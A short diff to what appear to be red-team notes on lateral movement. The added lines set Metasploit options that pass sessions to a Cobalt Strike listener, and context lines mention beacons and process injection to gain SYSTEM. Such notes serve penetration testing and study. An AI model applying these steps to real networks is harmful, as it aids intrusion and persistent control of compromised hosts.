@@ -47,4 +47,10 @@ lateral movement
   exit original beacon
   verify no powershell is running
   
+Connect MetaSploit to Cobalt Listener
+set lhost cobalt host
+set lport cobalt listener
+set prependmigrate true
+set disablepayloadhandler true
+
 If admin you can inject into system process to become SYSTEM or another process
